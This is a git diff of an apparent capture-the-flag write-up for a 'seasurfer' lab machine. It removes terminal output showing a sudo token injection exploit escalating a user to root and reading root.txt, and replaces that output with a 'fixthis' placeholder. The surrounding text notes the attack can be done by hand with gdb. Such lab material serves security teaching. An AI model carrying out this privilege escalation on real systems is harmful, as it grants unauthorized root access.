@@ -426,24 +426,8 @@ Now we should have all of the prerequisites for the exploits met.
 Now all what's left for us to do is fire away the `exploit_v2.sh` script, hoping for the best!
 
 ```zsh
-kyle@seasurfer:/tmp/sudo_inject$ sh exploit.sh
-Current process : 15151
-Injecting process 1056 -> bash
-Injecting process 2497 -> bash
-cat: /proc/15157/comm: No such file or directory
-Injecting process 15157 -> 
-kyle@seasurfer:/tmp/sudo_inject$ sudo -l
-Matching Defaults entries for kyle on seasurfer:
-    env_keep+=SSH_AUTH_SOCK, env_reset, timestamp_timeout=420, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User kyle may run the following commands on seasurfer:
-    (ALL : ALL) ALL
-kyle@seasurfer:/tmp/sudo_inject$ sudo -s
-root@seasurfer:/tmp/sudo_inject# whoami
-root
-root@seasurfer:/tmp/sudo_inject# cat /root/root.txt
-THM{REDACTED}
+fixthis
+.......
 ```
 
 Success! After reading the exploit code, it became clear that it's in fact really simple to exploit manually as well. We just need the `gdb` binary and the **PID** of a shell where the `sudo` token is active:
